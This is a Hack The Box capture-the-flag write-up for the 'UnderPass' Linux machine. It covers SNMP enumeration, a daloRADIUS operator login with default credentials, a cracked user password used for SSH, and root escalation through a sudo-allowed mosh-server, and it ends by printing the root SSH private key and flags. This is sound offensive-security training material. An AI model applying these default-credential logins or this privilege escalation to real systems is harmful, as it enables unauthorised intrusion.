---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - SNMP
  - snmpwalk
  - daloRADIUS
  - DefaultCredentials
  - mosh
---

![](images/UnderPass.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumeration of Port 161/UDP](#Enumeration-of-Port-161UDP)
    - [Directory Busting](#Directory-Busting)
- [daloRADIUS](#daloRADIUS)
- [Foothold](#Foothold)
- [user.txt](#usertxt)
- [Enumeration](#Enumeration)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Summary

The box starts with `enumeration` of port `161/UDP`. By using `snmpwalk` you can find information about an application called `daloRADIUS`. By doing some research the default `login pages` for `normal users` and `operators` can be found. For the `operators login page` the `default credentials` are working. On the `dashboard` a user called `svcMosh` and it's corresponding `hash` can be found. The `cleartext password` can be found on `crackstation.net` for example. With the `password` login using `SSH` with the `username` of `svcMosh` typed out `case sensitive` is possible and also access to the `user.txt`. After the `foothold` the way for `privilege escalation` to `root` is starting a new `instance` of the `mosh-server` which can be executed using `sudo`. After connecting to the new instance you receive a `shell` as `root` and can grab the `root.txt`.

## Reconnaissance

### Port Scanning

The box offered the unusual port `161/UDP` which we focused on after checking port `80/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.106.165
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 20:02 CET
Nmap scan report for 10.129.106.165
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU -p 10.129.106.165
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 20:08 CET
Nmap scan report for 10.129.106.165
Host is up (0.018s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
```

### Enumeration of Port 80/TCP

On port `80/TCP` we only found the `Apache2 Default Page` displayed.

- [http://10.129.106.165/](http://10.129.106.165/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.106.165/
http://10.129.106.165/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.106.165], Title[Apache2 Ubuntu Default Page: It works]
```

![](images/2024-12-21_20-11_80_website.png)

### Enumeration of Port 161/UDP

Since the `website` didn't offered that much, we focused on port `161/UDP` as mentioned earlier. Therefore we started with `snmpwalk` and found a `username` and also the information about `daloRADIUS` running on the box.

```c
┌──(kali㉿kali)-[~]
└─$ snmpwalk -v2c -c public 10.129.106.165 .1
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (44824) 0:07:28.24
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (45971) 0:07:39.71
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 15 13 09 09 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

| Email               |
| ------------------- |
| steve@underpass.htb |

```c
UnDerPass.htb is the only daloradius server in the basin!
```

We added `UnDerPass.htb` to our `/etc/hosts` file just in case we needed to deal with it at some point.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.129.106.165  UnDerPass.htb
```

### Directory Busting

We didn't find any `website` or `login` so far and because of that we started with some `directory busting` to find the location where `daloRADIUS` was running.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://underpass.htb/daloradius/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_underpass.htb/_daloradius__24-12-21_20-13-38.txt

Target: http://underpass.htb/

[20:13:38] Starting: daloradius/
[20:13:41] 200 -  221B  - /daloradius/.gitignore                            
[20:14:02] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[20:14:08] 200 -   24KB - /daloradius/ChangeLog                             
[20:14:12] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[20:14:12] 200 -    2KB - /daloradius/Dockerfile                            
[20:14:12] 200 -    2KB - /daloradius/docker-compose.yml                    
[20:14:23] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
[20:14:23] 200 -   18KB - /daloradius/LICENSE                               
[20:14:36] 200 -   10KB - /daloradius/README.md                             
[20:14:40] 301 -  325B  - /daloradius/setup  ->  http://underpass.htb/daloradius/setup/
                                                                             
Task Completed
```

## daloRADIUS

First we had a closer look at the `files` we found during the `directory brute force` and found some `credentials`.

```c
┌──(kali㉿kali)-[~]
└─$ curl http://underpass.htb/daloradius/.gitignore
.idea/
*.log
*.db
invoice_preview.html
.DS_Store
data/
internal_data/

var/log/*.log
var/backup/*.sql
app/common/includes/daloradius.conf.php
app/common/library/htmlpurifier/HTMLPurifier/DefinitionCache/Serializer/HTML/*
```

```c
┌──(kali㉿kali)-[~]
└─$ curl http://underpass.htb/daloradius/docker-compose.yml
version: "3"

services:

  radius-mysql:
    image: mariadb:10
    container_name: radius-mysql
    restart: unless-stopped
    environment:
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
    volumes:
      - "./data/mysql:/var/lib/mysql"

  radius:
    container_name: radius
    build:
      context: .
      dockerfile: Dockerfile-freeradius
    restart: unless-stopped
    depends_on: 
      - radius-mysql
    ports:
      - '1812:1812/udp'
      - '1813:1813/udp'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional settings
      - DEFAULT_CLIENT_SECRET=testing123
    volumes:
      - ./data/freeradius:/data
    # If you want to disable debug output, remove the command parameter
    command: -X

  radius-web:
    build: .
    container_name: radius-web
    restart: unless-stopped
    depends_on:
      - radius
      - radius-mysql
    ports:
      - '80:80'
      - '8000:8000'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional Settings:
      - DEFAULT_CLIENT_SECRET=testing123
      - DEFAULT_FREERADIUS_SERVER=radius
      - MAIL_SMTPADDR=127.0.0.1
      - MAIL_PORT=25
      - MAIL_FROM=root@daloradius.xdsl.by
      - MAIL_AUTH=

    volumes:
      - ./data/daloradius:/data
```

Since those were documented as `default credentials` we searched for the `repository` on `GitHub` to find the actual `login pages`.

- [https://github.com/lirantal/daloradius/tree/master/app/users](https://github.com/lirantal/daloradius/tree/master/app/users)
- [http://underpass.htb/daloradius/app/users/login.php](http://underpass.htb/daloradius/app/users/login.php)
- [http://underpass.htb/daloradius/app/operators/login.php](http://underpass.htb/daloradius/app/operators/login.php)

![](images/2024-12-21_20-20_80_daloradius_login.png)

On the `login page` for the `operators` we tried the `default credentials` of `administrator:radius` and got logged in.

![](images/2024-12-21_20-24_80_daloradius_operator_login.png)

| Username      | Password |
| ------------- | -------- |
| administrator | radius   |

![](images/2024-12-21_20-25_80_daloradius_administrator_dashboard.png)

## Foothold

For the `foothold` we checked the available `users` and found a `hash` of the user `svcMosh`.

![](images/2024-12-21_20-31_80_daloradius_list_users.png)

| Username | Password                         |
| -------- | -------------------------------- |
| svcMOSH  | 412DD4759978ACFCC81DEAB01B382403 |

The `hash` was already `cracked` and so the `cleartext password` could be found on https://crackstation.net.

- [https://crackstation.net/](https://crackstation.net/)

| Username | Password          |
| -------- | ----------------- |
| svcMosh  | underwaterfriends |

After a bit of trial and error we figured out that the `username` for the `login` via `SSH` was `case sensitive`. After the successful `login` we grabbed the `user.txt` and proceeded with the `enumeration` as `svcMosh`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh svcMosh@underpass.htb
The authenticity of host 'underpass.htb (10.129.106.165)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
svcMosh@underpass.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Dec 21 07:44:57 PM UTC 2024

  System load:  0.16              Processes:             227
  Usage of /:   85.6% of 3.75GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.129.106.165
  Swap usage:   0%

  => / is using 85.6% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Thu Dec 12 15:45:42 2024 from 10.10.14.65

svcMosh@underpass:~$
```

## user.txt

```c
svcMosh@underpass:~$ cat user.txt 
51667f3f1053b708ba5eefacedaaf240
```

## Enumeration

As always we checked the `group permissions`, the `/etc/passwd` and `sudo permissions`.

```c
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
```

```c
svcMosh@underpass:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
freerad:x:114:120::/etc/freeradius:/usr/sbin/nologin
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
Debian-snmp:x:116:122::/var/lib/snmp:/bin/false
tftp:x:117:123:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
svcMosh:x:1002:1002:svcMosh,60001,8675309,8675309:/home/svcMosh:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

This time got lucky and found `(ALL) NOPASSWD: /usr/bin/mosh-server` as output of `sudo -l` which basically meant that we could start an `instance` with `mosh-server` to `login` too.

```c
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

## Privilege Escalation to root

We read the documentation and created a new `instance`.

- [https://linux.die.net/man/1/mosh-server](https://linux.die.net/man/1/mosh-server)
- [https://mosh.org/#usage](https://mosh.org/#usage)

```c
svcMosh@underpass:~$ sudo /usr/bin/mosh-server new


MOSH CONNECT 60001 iey35k7JN06zfc03GeNGEQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 3395]
```

Then we used the `key` the `mosh-server` was offering us to login on port `60001/UDP` and got granted with a `shell` as `root`.

```c
svcMosh@underpass:~$ MOSH_KEY=iey35k7JN06zfc03GeNGEQ mosh-client 10.129.106.165 60001
```

```c
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Dec 21 08:26:18 PM UTC 2024

  System load:  0.07              Processes:             229
  Usage of /:   86.9% of 3.75GB   Users logged in:       1
  Memory usage: 13%               IPv4 address for eth0: 10.129.106.165
  Swap usage:   0%

  => / is using 86.9% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~#
```

## root.txt

```c
root@underpass:~# cat /root/root.txt 
5afa5eae158586010a1cc8e0248ee7c9
```

## Post Exploitation

```c
root@underpass:~/.ssh# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```